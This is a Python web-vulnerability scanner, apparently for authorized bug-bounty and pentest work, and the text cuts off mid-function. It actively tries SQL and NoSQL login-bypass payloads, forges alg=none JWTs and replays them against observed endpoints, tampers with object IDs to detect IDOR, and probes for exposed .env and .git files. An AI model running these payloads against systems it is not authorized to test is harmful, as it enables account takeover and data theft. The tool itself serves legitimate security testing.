#!/usr/bin/env python3
"""
logicscan.py — Headless crawl + logic/functional vulnerability triage
Author: 0xSH4N

Give it an endpoint (an auth page, a dashboard, whatever) and it will:
  1. Crawl it headlessly (real Chromium via Playwright -- JS-rendered forms/links/
     XHR calls all get captured, not just the static HTML)
  2. Discover login forms, parameterized API calls, JWTs, cookies, state-changing forms
  3. Actively test logic/functional bug classes against what it found:
       - NoSQLi / SQLi authentication bypass on login forms
       - JWT weaknesses (alg=none acceptance, no-expiry, sensitive payload data)
       - BOLA/IDOR (same-session ID tampering across discovered object endpoints)
       - Missing-auth / excessive data exposure (same endpoint, zero cookies)
       - Info disclosure (exposed .env/.git, source maps, GraphQL introspection,
         verbose errors, PII/secret patterns in any captured response)
       - CSRF-token presence on state-changing forms
       - Clickjacking / missing security headers
       - Session cookie flags (Secure/HttpOnly/SameSite)
  4. Classifies every finding for either --mode bb (bug-bounty: tags what's typically
     OUT OF SCOPE per common program policy so you can drop it from a report) or
     --mode pt (pentest: full technical severity, no scope filtering)

Runs seeds concurrently -- each seed gets its own worker thread with its own
Chromium instance (Playwright's sync API is safe used this way: one instance per
thread, never shared across threads).

IMPORTANT: this is for authorized testing only (your own bug bounty scope or a
pentest engagement you're contracted for). Logic/functional bugs are judgment calls
by nature -- every finding here is a LEAD with evidence, not a confirmed bug. Verify
manually before reporting.

Usage:
    python3 logicscan.py -u https://example.com/auth/sign_in --mode bb
    python3 logicscan.py -u https://example.com/dashboard --cookie "session=abc123; csrftoken=xyz" --mode pt
    python3 logicscan.py -l seeds.txt --cookie-file cookies.json -t 6 -o results/
    python3 logicscan.py -u https://example.com/dashboard --cookie "session=abc" --cookie2 "session=def"  # true cross-account BOLA

Cookie formats accepted (auto-detected):
    raw header string:  "name=value; name2=value2"   (paste straight from devtools)
    JSON list:           [{"name":"session","value":"abc","domain":"example.com"}, ...]
    Playwright storage_state.json (the "cookies" key is used automatically)
"""

import argparse
import base64
import json
import os
import re
import sys
import threading
import time
from dataclasses import dataclass, field
from urllib.parse import urlsplit, urljoin, parse_qsl, urlencode, urlunsplit

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    from playwright.sync_api import sync_playwright, TimeoutError as PwTimeout
except ImportError:
    print("[!] playwright is required: pip3 install --break-system-packages playwright && playwright install chromium")
    sys.exit(1)

DEFAULT_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36 logicscan/1.0"
SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}

# ─────────────────────────────── BB-scope classification ────────────────────────────────
# Heuristic guidance based on common HackerOne/Bugcrowd program policy patterns.
# Programs vary -- this tags likely scope, it is not a substitute for reading the policy.

BB_SCOPE = {
    "nosqli_auth_bypass":   ("in_scope", "Authentication bypass is almost always in scope and high-value."),
    "sqli_auth_bypass":     ("in_scope", "Authentication bypass is almost always in scope and high-value."),
    "jwt_alg_none":         ("in_scope", "Signature-verification bypass is a critical, almost always in-scope auth flaw."),
    "jwt_no_expiry":        ("varies", "Often accepted as a lower-severity auth-hygiene finding; check policy."),
    "jwt_sensitive_data":   ("varies", "Often accepted as low/info unless the data enables further attack."),
    "bola_same_session":    ("in_scope", "BOLA/IDOR is a classic high-value bug-bounty finding."),
    "bola_cross_account":   ("in_scope", "Confirmed cross-account BOLA/IDOR -- in scope, high value."),
    "missing_auth":         ("in_scope", "Unauthenticated access to protected data/functionality is in scope."),
    "info_disclosure_secret": ("in_scope", "Exposed credentials/keys/config are in scope, typically high severity."),
    "info_disclosure_pii":  ("in_scope", "Exposed PII is in scope, severity depends on volume/sensitivity."),
    "info_disclosure_debug": ("varies", "Verbose errors/stack traces alone are often low/informational; check policy."),
    "source_map_exposed":   ("varies", "Often low/informational unless it reveals secrets or internal API structure."),
    "graphql_introspection":("varies", "Often accepted as low/info; some programs explicitly exclude it."),
    "csrf_missing":         ("varies", "In scope only if the action is state-changing and impact is demonstrated."),
    "missing_security_headers": ("out_of_scope", "Missing CSP/HSTS/X-CTO alone is excluded by most major programs."),
    "clickjacking":         ("out_of_scope", "Usually excluded unless framing enables a real state-changing attack."),
    "cors_wildcard":        ("out_of_scope", "Wildcard ACAO with no credentials is usually not rewarded alone."),
    "cors_reflected_creds": ("in_scope", "Reflected Origin + Allow-Credentials:true is a real, in-scope CORS vuln."),
    "cookie_flags_missing": ("varies", "Often low/informational unless session hijack impact is shown."),
    "host_header_reflected": ("varies", "Low/info unless chained into password-reset poisoning or cache poisoning."),
    "open_redirect":        ("varies", "Many programs exclude standalone open redirect; in scope if chainable."),
    "rate_limit_missing":   ("out_of_scope", "Most programs explicitly exclude missing rate limiting."),
    "mass_assignment_candidate": ("varies", "Needs manual confirmation; in scope if privilege escalation is shown."),
}

def bb_classify(kind):
    return BB_SCOPE.get(kind, ("varies", "Not in the common-exclusion list -- use judgment / check program policy."))


# ─────────────────────────────── data structures ────────────────────────────────

@dataclass
class Finding:
    kind: str
    seed: str
    url: str
    severity: str = "info"
    summary: str = ""
    evidence: str = ""
    extra: dict = field(default_factory=dict)

    def to_dict(self, mode):
        d = {
            "kind": self.kind, "seed": self.seed, "url": self.url,
            "severity": self.severity, "summary": self.summary,
            "evidence": self.evidence, "extra": self.extra,
        }
        if mode == "bb":
            verdict, note = bb_classify(self.kind)
            d["bb_scope"] = verdict
            d["bb_note"] = note
        return d


class FindingSink:
    def __init__(self):
        self.lock = threading.Lock()
        self.findings = []

    def add(self, f: Finding):
        with self.lock:
            self.findings.append(f)
        print(f"    -> [{f.severity.upper()}] {f.kind} | {f.url} | {f.summary}")


@dataclass
class CrawlData:
    seed: str
    final_url: str = ""
    status: int = 0
    title: str = ""
    forms: list = field(default_factory=list)       # {action, method, inputs:[{name,type}]}
    links: list = field(default_factory=list)        # same-origin discovered links
    xhr_calls: list = field(default_factory=list)    # {method, url, post_data, resource_type, headers}
    responses: list = field(default_factory=list)    # {url, status, headers, body(trunc)}
    cookies: list = field(default_factory=list)       # playwright cookie dicts
    storage_tokens: list = field(default_factory=list)  # jwt-looking strings from localStorage/sessionStorage


# ─────────────────────────────── cookie parsing ────────────────────────────────

def parse_cookie_input(raw_arg, file_arg, seed_url):
    """Returns (playwright_cookie_list, requests_cookie_dict). Accepts raw header
    string, JSON list of cookie dicts, or a Playwright storage_state.json."""
    text = raw_arg
    if file_arg:
        with open(file_arg) as fh:
            text = fh.read().strip()
    if not text:
        return [], {}

    host = urlsplit(seed_url).hostname or ""

    # try JSON first
    try:
        data = json.loads(text)
        cookie_list = data.get("cookies", data) if isinstance(data, dict) else data
        pw_cookies, req_cookies = [], {}
        for c in cookie_list:
            name, value = c.get("name"), c.get("value")
            if name is None:
                continue
            pw_cookies.append({
                "name": name, "value": value,
                "domain": c.get("domain") or host,
                "path": c.get("path") or "/",
                "secure": c.get("secure", False),
                "httpOnly": c.get("httpOnly", False),
                "sameSite": c.get("sameSite", "Lax"),
            })
            req_cookies[name] = value
        return pw_cookies, req_cookies
    except (json.JSONDecodeError, TypeError, AttributeError):
        pass

    # fall back to raw "name=value; name2=value2" header string
    pw_cookies, req_cookies = [], {}
    for part in text.split(";"):
        part = part.strip()
        if "=" not in part:
            continue
        name, value = part.split("=", 1)
        name, value = name.strip(), value.strip()
        pw_cookies.append({"name": name, "value": value, "domain": host, "path": "/"})
        req_cookies[name] = value
    return pw_cookies, req_cookies


# ─────────────────────────────── JWT utilities ────────────────────────────────

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{0,}")

def b64url_decode(s):
    s += "=" * (-len(s) % 4)
    try:
        return base64.urlsafe_b64decode(s.encode())
    except Exception:
        return b""

def b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def decode_jwt(token):
    parts = token.split(".")
    if len(parts) < 2:
        return None, None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return header, payload
    except Exception:
        return None, None

def forge_alg_none(token):
    parts = token.split(".")
    if len(parts) < 2:
        return None
    header, payload = decode_jwt(token)
    if header is None:
        return None
    header["alg"] = "none"
    new_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    return f"{new_header}.{parts[1]}."


# ─────────────────────────────── payload sets ────────────────────────────────

NOSQLI_JSON_PAYLOADS = [
    {"$ne": None}, {"$ne": ""}, {"$gt": ""}, {"$regex": ".*"}, {"$exists": True},
]
NOSQLI_FORM_SUFFIXES = ["[$ne]=1", "[$gt]=", "[$regex]=.*", "[$exists]=true"]
SQLI_AUTH_BYPASS_PAYLOADS = [
    "' OR '1'='1", "' OR '1'='1'-- -", "' OR 1=1-- -", "admin'-- -", "\" OR \"1\"=\"1",
]
LOGIN_FAIL_KEYWORDS = re.compile(r"invalid|incorrect|failed|wrong|denied|does not match|not found", re.I)
LOGIN_FIELD_USER_RE = re.compile(r"user|email|login|uid", re.I)
LOGIN_FIELD_PASS_RE = re.compile(r"pass|pwd", re.I)
CSRF_FIELD_RE = re.compile(r"csrf|_token|authenticity_token|xsrf", re.I)

SECURITY_HEADERS = ["Content-Security-Policy", "Strict-Transport-Security", "X-Frame-Options",
                     "X-Content-Type-Options", "Referrer-Policy"]

SECRET_PATTERNS = {
    "aws_key": re.compile(r"AKIA[0-9A-Z]{16}"),
    "google_api": re.compile(r"AIza[0-9A-Za-z\-_]{35}"),
    "private_key_block": re.compile(r"-----BEGIN (RSA |EC |)PRIVATE KEY-----"),
    "generic_secret": re.compile(r"(?:secret|api[_-]?key|access[_-]?token|password|db_pass)\s*[:=]\s*['\"]?[A-Za-z0-9_\-./+=]{6,}", re.I),
}
PII_PATTERNS = {
    "email": re.compile(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+"),
}
DEBUG_PATTERNS = {
    "stack_trace": re.compile(r"Traceback \(most recent call last\)|at [\w.$]+\(.*\.java:\d+\)|Exception in thread", re.I),
    "django_debug": re.compile(r"DisallowedHost|Django Version:|DEBUG = True", re.I),
    "php_error": re.compile(r"Fatal error:.*on line \d+|Warning:.*in .*\.php", re.I),
}

OBJECT_ID_IN_PATH_RE = re.compile(r"/(\d{1,10})(?=[/?]|$)")
UUID_RE = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", re.I)

COMMON_SENSITIVE_PATHS = [
    "/.env", "/.git/config", "/.git/HEAD", "/config.json", "/swagger.json",
    "/swagger-ui.html", "/graphql", "/.well-known/security.txt", "/actuator/env",
    "/actuator/health", "/server-status", "/debug", "/api/debug",
]
GRAPHQL_INTROSPECTION_QUERY = {"query": "query{__schema{types{name}}}"}


# ─────────────────────────────── crawler (one per worker thread) ────────────────────────────────

class Crawler:
    def __init__(self, timeout_ms, depth, max_pages, headless):
        self.timeout_ms = timeout_ms
        self.depth = depth
        self.max_pages = max_pages
        self.headless = headless

    def crawl(self, seed, pw_cookies) -> CrawlData:
        data = CrawlData(seed=seed)
        origin = f"{urlsplit(seed).scheme}://{urlsplit(seed).netloc}"
        visited, to_visit = set(), [(seed, 0)]

        with sync_playwright() as p:
            browser = p.chromium.launch(headless=self.headless, args=["--ignore-certificate-errors"])
            context = browser.new_context(user_agent=DEFAULT_UA, ignore_https_errors=True)
            if pw_cookies:
                try:
                    context.add_cookies(pw_cookies)
                except Exception as e:
                    print(f"    [!] cookie injection failed for {seed}: {e}")
            page = context.new_page()

            def on_request(req):
                if req.resource_type in ("xhr", "fetch", "document"):
                    try:
                        data.xhr_calls.append({
                            "method": req.method, "url": req.url,
                            "post_data": req.post_data or "",
                            "resource_type": req.resource_type,
                            "headers": dict(req.headers),
                        })
                    except Exception:
                        pass

            def on_response(resp):
                try:
                    if resp.request.resource_type in ("xhr", "fetch", "document") and len(data.responses) < 120:
                        ctype = resp.headers.get("content-type", "")
                        body = ""
                        if "text" in ctype or "json" in ctype or "javascript" in ctype or ctype == "":
                            try:
                                body = resp.text()[:8000]
                            except Exception:
                                body = ""
                        data.responses.append({
                            "url": resp.url, "status": resp.status,
                            "headers": dict(resp.headers), "body": body,
                        })
                except Exception:
                    pass

            page.on("request", on_request)
            page.on("response", on_response)

            pages_done = 0
            while to_visit and pages_done < self.max_pages:
                url, d = to_visit.pop(0)
                if url in visited or d > self.depth:
                    continue
                visited.add(url)
                try:
                    resp = page.goto(url, timeout=self.timeout_ms, wait_until="networkidle")
                    page.wait_for_timeout(300)
                except PwTimeout:
                    try:
                        resp = page.goto(url, timeout=self.timeout_ms, wait_until="domcontentloaded")
                    except Exception:
                        continue
                except Exception:
                    continue
                pages_done += 1

                if url == seed:
                    data.final_url = page.url
                    data.status = resp.status if resp else 0
                    try:
                        data.title = page.title()
                    except Exception:
                        pass

                # forms
                try:
                    for form_el in page.query_selector_all("form"):
                        action = form_el.get_attribute("action") or url
                        method = (form_el.get_attribute("method") or "GET").upper()
                        inputs = []
                        for inp in form_el.query_selector_all("input, textarea, select"):
                            inputs.append({
                                "name": inp.get_attribute("name") or "",
                                "type": inp.get_attribute("type") or "text",
                            })
                        data.forms.append({"action": urljoin(url, action), "method": method, "inputs": inputs,
                                            "page": url})
                except Exception:
                    pass

                # same-origin links, shallow
                if d < self.depth:
                    try:
                        for a in page.query_selector_all("a[href]"):
                            href = a.get_attribute("href") or ""
                            full = urljoin(url, href)
                            if full.startswith(origin) and full not in visited:
                                to_visit.append((full, d + 1))
                    except Exception:
                        pass

                # localStorage / sessionStorage JWT hunting
                try:
                    storage = page.evaluate("""() => {
                        const out = [];
                        for (const store of [localStorage, sessionStorage]) {
                            for (let i = 0; i < store.length; i++) {
                                const k = store.key(i);
                                out.push(store.getItem(k));
                            }
                        }
                        return out;
                    }""")
                    for item in storage or []:
                        if item:
                            data.storage_tokens.extend(JWT_RE.findall(str(item)))
                except Exception:
                    pass

            try:
                data.cookies = context.cookies()
            except Exception:
                pass

            browser.close()
        return data


# ─────────────────────────────── testers ────────────────────────────────

class LogicTester:
    def __init__(self, sink: FindingSink, seed, req_cookies, req_cookies2, timeout, time_based):
        self.sink = sink
        self.seed = seed
        self.req_cookies = req_cookies or {}
        self.req_cookies2 = req_cookies2 or {}
        self.timeout = timeout
        self.time_based = time_based
        self.sess = requests.Session()
        self.sess.headers.update({"User-Agent": DEFAULT_UA})
        self.sess.verify = False

    # ---- auth bypass (NoSQLi / SQLi) ----

    def is_login_form(self, form):
        names = " ".join(i["name"] for i in form["inputs"])
        has_pw = any(i["type"] == "password" for i in form["inputs"]) or LOGIN_FIELD_PASS_RE.search(names)
        has_user = LOGIN_FIELD_USER_RE.search(names) or any(i["type"] in ("text", "email") for i in form["inputs"])
        return bool(has_pw and has_user)

    def test_auth_bypass(self, crawl: CrawlData):
        for form in crawl.forms:
            if not self.is_login_form(form):
                continue
            if form["method"] != "POST":
                continue
            user_field = next((i["name"] for i in form["inputs"] if LOGIN_FIELD_USER_RE.search(i["name"])), None)
            pass_field = next((i["name"] for i in form["inputs"] if i["type"] == "password" or LOGIN_FIELD_PASS_RE.search(i["name"])), None)
            if not user_field or not pass_field:
                continue

            baseline_data = {user_field: "nonexistent_user_zxy", pass_field: "wrong_password_zxy"}
            try:
                baseline = self.sess.post(form["action"], data=baseline_data, timeout=self.timeout, allow_redirects=False)
            except Exception:
                continue
            baseline_cookies = set(self.sess.cookies.get_dict().keys())

            # --- NoSQLi: JSON body operator injection ---
            for payload in NOSQLI_JSON_PAYLOADS:
                body = {user_field: payload, pass_field: payload}
                try:
                    r = self.sess.post(form["action"], json=body, timeout=self.timeout, allow_redirects=False)
                except Exception:
                    continue
                if self._looks_bypassed(baseline, r):
                    self.sink.add(Finding(
                        kind="nosqli_auth_bypass", seed=self.seed, url=form["action"], severity="critical",
                        summary=f"Login form appears bypassable via NoSQL operator injection ({user_field}/{pass_field})",
                        evidence=f"payload={json.dumps(payload)} | baseline_status={baseline.status_code} -> bypass_status={r.status_code}, "
                                 f"redirect={r.headers.get('Location','')}",
                        extra={"form_action": form["action"]}))
                    break

            # --- NoSQLi: bracket-notation form encoding (Express/qs-style parsers) ---
            for suffix in NOSQLI_FORM_SUFFIXES:
                data = {f"{user_field}{suffix}": "", pass_field: "anything"}
                try:
                    r = self.sess.post(form["action"], data=data, timeout=self.timeout, allow_redirects=False)
                except Exception:
                    continue
                if self._looks_bypassed(baseline, r):
                    self.sink.add(Finding(
                        kind="nosqli_auth_bypass", seed=self.seed, url=form["action"], severity="critical",
                        summary=f"Login form appears bypassable via bracket-notation NoSQL injection ({user_field}{suffix})",
                        evidence=f"baseline_status={baseline.status_code} -> bypass_status={r.status_code}",
                        extra={"form_action": form["action"]}))
                    break

            # --- classic SQLi auth bypass ---
            for payload in SQLI_AUTH_BYPASS_PAYLOADS:
                data = {user_field: payload, pass_field: payload}
                try:
                    r = self.sess.post(form["action"], data=data, timeout=self.timeout, allow_redirects=False)
                except Exception:
                    continue
                if self._looks_bypassed(baseline, r):
                    self.sink.add(Finding(
                        kind="sqli_auth_bypass", seed=self.seed, url=form["action"], severity="critical",
                        summary=f"Login form appears bypassable via SQL injection ({user_field}/{pass_field})",
                        evidence=f"payload={payload!r} | baseline_status={baseline.status_code} -> bypass_status={r.status_code}",
                        extra={"form_action": form["action"]}))
                    break

            # --- CSRF token presence on this state-changing form ---
            if not any(CSRF_FIELD_RE.search(i["name"]) for i in form["inputs"]):
                self.sink.add(Finding(
                    kind="csrf_missing", seed=self.seed, url=form["action"], severity="medium",
                    summary="State-changing form has no visible CSRF token field",
                    evidence=f"form fields: {[i['name'] for i in form['inputs']]}",
                    extra={}))

    def _looks_bypassed(self, baseline, resp):
        if resp.status_code in (301, 302, 303, 307, 308) and baseline.status_code not in (301, 302, 303, 307, 308):
            loc = resp.headers.get("Location", "")
            if loc and not re.search(r"sign.?in|log.?in|auth", loc, re.I):
                return True
        new_cookies = set(self.sess.cookies.get_dict().keys())
        if new_cookies and any(re.search(r"session|token|auth|sid", c, re.I) for c in new_cookies):
            try:
                baseline_text = baseline.text
            except Exception:
                baseline_text = ""
            if not LOGIN_FAIL_KEYWORDS.search(baseline_text):
                return False  # baseline itself didn't show a clear failure marker, too ambiguous
            return True
        try:
            rtext = resp.text
        except Exception:
            rtext = ""
        if resp.status_code == 200 and LOGIN_FAIL_KEYWORDS.search(getattr(baseline, "text", "") or "") and not LOGIN_FAIL_KEYWORDS.search(rtext) and len(rtext) > 0 and rtext != baseline.text:
            return True
        return False

    # ---- JWT analysis ----

    def test_jwt(self, crawl: CrawlData):
        candidates = set(crawl.storage_tokens)
        for c in crawl.cookies:
            v = c.get("value", "")
            if JWT_RE.match(v or ""):
                candidates.add(v)
        for resp in crawl.responses:
            candidates |= set(JWT_RE.findall(resp.get("body", "") or ""))

        # map token -> (method, url) of every captured request that actually sent it as
        # a Bearer token, so the active alg=none replay hits a real consumer, not a guess
        token_consumers = {}
        for call in crawl.xhr_calls:
            auth = (call.get("headers", {}) or {}).get("authorization", "")
            m = re.match(r"Bearer\s+(.+)", auth, re.I)
            if m:
                token_consumers.setdefault(m.group(1), []).append((call["method"], call["url"]))

        for token in candidates:
            header, payload = decode_jwt(token)
            if header is None:
                continue
            consumers = token_consumers.get(token, [])
            url_hint = consumers[0][1] if consumers else (crawl.final_url or self.seed)

            if str(header.get("alg", "")).lower() == "none":
                self.sink.add(Finding(kind="jwt_alg_none", seed=self.seed, url=url_hint, severity="critical",
                                       summary="JWT already uses alg=none (no signature)",
                                       evidence=f"header={header}", extra={}))
            elif consumers:
                # only replay against an endpoint we actually observed consuming this
                # token as Authorization: Bearer -- avoids false positives from hitting
                # unrelated pages that ignore the header entirely
                forged = forge_alg_none(token)
                if forged:
                    for method, consumer_url in consumers:
                        try:
                            r = self.sess.request(method, consumer_url, headers={"Authorization": f"Bearer {forged}"},
                                                   timeout=self.timeout, cookies=self.req_cookies)
                            # compare against a request with the header stripped entirely, so a
                            # 200 caused by some other auth mechanism (e.g. the cookie) doesn't
                            # get misread as the forged token being accepted
                            r_noauth = self.sess.request(method, consumer_url, timeout=self.timeout)
                            if r.status_code == 200 and len(r.text) > 20 and (r_noauth.status_code != 200 or r_noauth.text != r.text):
                                self.sink.add(Finding(
                                    kind="jwt_alg_none", seed=self.seed, url=consumer_url, severity="critical",
                                    summary="Endpoint accepts a forged alg=none JWT in place of the real signed token",
                                    evidence=f"method={method} forged_token_prefix={forged[:40]}... "
                                             f"with_token_status={r.status_code}, no_auth_header_status={r_noauth.status_code}",
                                    extra={}))
                        except Exception:
                            pass
            else:
                # no observed consumer for this token -- report it as a lead only, don't
                # actively replay it against an unrelated URL
                self.sink.add(Finding(
                    kind="jwt_no_expiry" if not payload.get("exp") else "jwt_sensitive_data",
                    seed=self.seed, url=crawl.final_url or self.seed, severity="info",
                    summary="JWT found (in storage/cookies) but no request was observed sending it as a Bearer "
                            "token -- alg=none was not actively tested; find the consuming endpoint and retest manually",
                    evidence=f"header={header}, payload_keys={list(payload.keys())}", extra={}))
                continue

            if not payload.get("exp"):
                self.sink.add(Finding(kind="jwt_no_expiry", seed=self.seed, url=url_hint, severity="low",
                                       summary="JWT payload has no 'exp' (expiry) claim",
                                       evidence=f"payload keys: {list(payload.keys())}", extra={}))
            sensitive_keys = [k for k in payload if re.search(r"pass|secret|ssn|role|admin|email", k, re.I)]
            if sensitive_keys:
                self.sink.add(Finding(kind="jwt_sensitive_data", seed=self.seed, url=url_hint, severity="low",
                                       summary=f"JWT payload carries potentially sensitive fields: {sensitive_keys}",
                                       evidence=f"payload={payload}", extra={}))

    # ---- BOLA / IDOR + missing auth ----

    def _candidate_object_urls(self, crawl: CrawlData):
        urls = set()
        for call in crawl.xhr_calls:
            u = call["url"]
            if OBJECT_ID_IN_PATH_RE.search(urlsplit(u).path) or UUID_RE.search(u):
                urls.add(u)
            qs = parse_qsl(urlsplit(u).query)
            if any(re.search(r"^(id|uid|user_id|account_id|order_id|object_id)$", k, re.I) for k, _ in qs):
                urls.add(u)
        return urls

    def test_bola(self, crawl: CrawlData):
        urls = self._candidate_object_urls(crawl)
        for url in urls:
            parts = urlsplit(url)
            path_match = OBJECT_ID_IN_PATH_RE.search(parts.path)
            qs = parse_qsl(parts.query)

            try:
                baseline = self.sess.get(url, cookies=self.req_cookies, timeout=self.timeout)
            except Exception:
                continue
            if baseline.status_code != 200:
                continue
            baseline_body = baseline.text[:4000]

            # missing-auth check: same URL, zero cookies
            try:
                noauth = requests.get(url, headers={"User-Agent": DEFAULT_UA}, timeout=self.timeout, verify=False)
                if noauth.status_code == 200 and len(noauth.text) > 30 and self._similar_structure(baseline_body, noauth.text):
                    self.sink.add(Finding(
                        kind="missing_auth", seed=self.seed, url=url, severity="high",
                        summary="Endpoint returns data with NO authentication cookie at all",
                        evidence=f"unauth_status={noauth.status_code}, body_len={len(noauth.text)}", extra={}))
            except Exception:
                pass

            # same-session ID tampering
            tampered_url = None
            if path_match:
                orig_id = path_match.group(1)
                new_id = str(int(orig_id) + 1)
                new_path = parts.path[:path_match.start(1)] + new_id + parts.path[path_match.end(1):]
                tampered_url = urlunsplit((parts.scheme, parts.netloc, new_path, parts.query, ""))
            elif qs:
                id_key = next((k for k, v in qs if re.search(r"^(id|uid|user_id|account_id|order_id|object_id)$", k, re.I) and v.isdigit()), None)
                if id_key:
                    new_qs = [(k, str(int(v) + 1) if k == id_key else v) for k, v in qs]
                    tampered_url = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(new_qs), ""))

            if tampered_url and tampered_url != url:
                try:
                    r2 = self.sess.get(tampered_url, cookies=self.req_cookies, timeout=self.timeout)
                    if r2.status_code == 200 and self._similar_structure(baseline_body, r2.text) and r2.text[:4000] != baseline_body:
                        self.sink.add(Finding(
                            kind="bola_same_session", seed=self.seed, url=tampered_url, severity="high",
                            summary="Tampering an object ID with the SAME session returned a different, "
                                    "similarly-structured object -- classic BOLA/IDOR pattern",
                            evidence=f"baseline={url}\ntampered={tampered_url}\nstatus={r2.status_code}", extra={}))
                except Exception:
                    pass

                # true cross-account confirmation if a second account's cookies were provided
                if self.req_cookies2:
                    try:
                        r3 = self.sess.get(url, cookies=self.req_cookies2, timeout=self.timeout)
                        if r3.status_code == 200 and self._similar_structure(baseline_body, r3.text) and r3.text[:4000] != baseline_body:
                            self.sink.add(Finding(
                                kind="bola_cross_account", seed=self.seed, url=url, severity="critical",
                                summary="CONFIRMED: a second account's session can read this object -- true cross-account BOLA",
                                evidence=f"account1_body_len={len(baseline_body)}, account2_body_len={len(r3.text)}", extra={}))
                    except Exception:
                        pass

    @staticmethod
    def _similar_structure(a, b):
        # cheap structural similarity: same rough length band + overlapping JSON-ish keys
        if not a or not b:
            return False
        len_ratio = min(len(a), len(b)) / max(len(a), len(b))
        if len_ratio < 0.4:
            return False
        keys_a = set(re.findall(r'"(\w+)"\s*:', a))
        keys_b = set(re.findall(r'"(\w+)"\s*:', b))
        if keys_a or keys_b:
            overlap = len(keys_a & keys_b) / max(1, len(keys_a | keys_b))
            return overlap > 0.5
        return len_ratio > 0.7

    # ---- info disclosure ----

    def test_info_disclosure(self, crawl: CrawlData):
        bodies = [(resp["url"], resp.get("body", "")) for resp in crawl.responses]

        origin = f"{urlsplit(self.seed).scheme}://{urlsplit(self.seed).netloc}"
        for path in COMMON_SENSITIVE_PATHS:
            url = origin + path
            try:
                r = self.sess.get(url, cookies=self.req_cookies, timeout=self.timeout)
                if r.status_code == 200 and len(r.text) > 0:
                    bodies.append((url, r.text[:8000]))
                    if path == "/graphql":
                        continue  # handled separately below via POST introspection
            except Exception:
                pass

        try:
            r = self.sess.post(origin + "/graphql", json=GRAPHQL_INTROSPECTION_QUERY, cookies=self.req_cookies, timeout=self.timeout)
            if r.status_code == 200 and "__schema" in r.text:
                self.sink.add(Finding(kind="graphql_introspection", seed=self.seed, url=origin + "/graphql", severity="low",
                                       summary="GraphQL introspection is enabled", evidence=r.text[:300], extra={}))
        except Exception:
            pass

        for url, body in bodies:
            if not body:
                continue
            fname = urlsplit(url).path.lower()
            if fname.endswith("/.env") and ("=" in body) and len(body) < 4000:
                self.sink.add(Finding(kind="info_disclosure_secret", seed=self.seed, url=url, severity="critical",
                                       summary="Exposed .env file", evidence=body[:300], extra={}))
            if "/.git/" in fname and ("ref:" in body or body.startswith("\x00") is False and len(body) < 2000):
                self.sink.add(Finding(kind="info_disclosure_secret", seed=self.seed, url=url, severity="high",
                                       summary="Exposed .git metadata", evidence=body[:200], extra={}))
            for name, pat in SECRET_PATTERNS.items():
                m = pat.search(body)
                if m:
                    self.sink.add(Finding(kind="info_disclosure_secret", seed=self.seed, url=url, severity="critical",
                                           summary=f"Possible secret exposed ({name})", evidence=m.group(0)[:100], extra={}))
            for name, pat in DEBUG_PATTERNS.items():
                m = pat.search(body)
                if m:
                    self.sink.add(Finding(kind="info_disclosure_debug", seed=self.seed, url=url, severity="medium",
                                           summary=f"Verbose debug/error output exposed ({name})", evidence=m.group(0)[:200], extra={}))
            emails = set(PII_PATTERNS["email"].findall(body))
            if len(emails) >= 2:
                self.sink.add(Finding(kind="info_disclosure_pii", seed=self.seed, url=url, severity="medium",
                                       summary=f"Multiple email addresses exposed in response ({len(emails)} found)",
                                       evidence=", ".join(list(emails)[:5]), extra={}))
            for m in re.finditer(r'src="([^"]+\.js)"', body):
                js_url = urljoin(url, m.group(1))
                map_url = js_url + ".map"
                try:
                    rmap = self.sess.get(map_url, timeout=self.timeout, cookies=self.req_cookies)
                    if rmap.status_code == 200 and '"sources"' in rmap.text:
                        self.sink.add(Finding(kind="source_map_exposed", seed=self.seed, url=map_url, severity="low",
                                               summary="JS source map exposed (reveals original source structure)",
                                               evidence="", extra={}))
                except Exception:
                    pass

    # ---- headers / clickjacking / cookie flags / CORS ----

    def test_headers_and_session(self, crawl: CrawlData):
        seen_urls = set()
        for resp in crawl.responses:
            url = resp["url"]
            if url in seen_urls:
                continue
            seen_urls.add(url)
            headers = {k.lower(): v for k, v in resp.get("headers", {}).items()}
            missing = [h for h in SECURITY_HEADERS if h.lower() not in headers]
            if missing:
                self.sink.add(Finding(kind="missing_security_headers", seed=self.seed, url=url, severity="info",
                                       summary=f"Missing security headers: {', '.join(missing)}", evidence="", extra={}))
            if "x-frame-options" not in headers and "content-security-policy" not in headers:
                self.sink.add(Finding(kind="clickjacking", seed=self.seed, url=url, severity="low",
                                       summary="Page can likely be framed (no X-Frame-Options/CSP frame-ancestors)",
                                       evidence="", extra={}))

        for c in crawl.cookies:
            name = c.get("name", "")
            if re.search(r"session|auth|token|sid", name, re.I):
                flags = []
                if not c.get("secure"):
                    flags.append("Secure")
                if not c.get("httpOnly"):
                    flags.append("HttpOnly")
                if c.get("sameSite", "None") in (None, "None"):
                    flags.append("SameSite")
                if flags:
                    self.sink.add(Finding(kind="cookie_flags_missing", seed=self.seed, url=crawl.final_url or self.seed,
                                           severity="low", summary=f"Session-like cookie '{name}' missing flags: {', '.join(flags)}",
                                           evidence="", extra={}))

        try:
            r = self.sess.get(crawl.final_url or self.seed, cookies=self.req_cookies, timeout=self.timeout,
                               headers={"Origin": "https://cors-test-evil.example.org"})
            aco = r.headers.get("Access-Control-Allow-Origin", "")
            acc = r.headers.get("Access-Control-Allow-Credentials", "")
            if aco == "https://cors-test-evil.example.org":
                kind = "cors_reflected_creds" if acc.lower() == "true" else "cors_wildcard"
                sev = "high" if acc.lower() == "true" else "medium"
                self.sink.add(Finding(kind=kind, seed=self.seed, url=crawl.final_url or self.seed, severity=sev,
